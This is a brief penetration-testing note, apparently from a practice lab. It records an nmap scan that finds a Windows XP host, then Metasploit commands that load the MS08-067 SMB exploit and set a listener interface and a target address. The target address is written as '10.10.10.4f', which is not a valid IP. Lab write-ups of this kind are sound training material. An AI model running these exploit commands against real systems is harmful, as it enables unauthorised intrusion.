# Notes

Ran nmap and saw there were only three ports opened and the scripts revealed that the operating system is window xp.
Searched google for `window-xp exploit`


```bash
use windows/smb/ms08_067_netapi
set lhost tun0
set rhosts 10.10.10.4f

```